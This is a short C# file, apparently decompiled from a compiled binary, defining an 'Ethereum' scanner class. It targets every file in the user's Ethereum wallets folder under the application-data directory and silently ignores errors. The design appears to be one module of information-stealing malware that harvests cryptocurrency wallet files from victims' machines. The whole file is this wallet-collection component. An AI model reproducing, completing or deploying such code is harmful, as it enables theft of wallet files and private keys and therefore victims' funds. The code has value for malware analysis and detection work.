using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000024 RID: 36
public class Eth : FileScanner
{
	// Token: 0x060000C6 RID: 198 RVA: 0x000038CA File Offset: 0x00001ACA
	public Eth()
	{
		base.Name = "Ethereum";
	}

	// Token: 0x060000C7 RID: 199 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000C8 RID: 200 RVA: 0x00008B40 File Offset: 0x00006D40
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
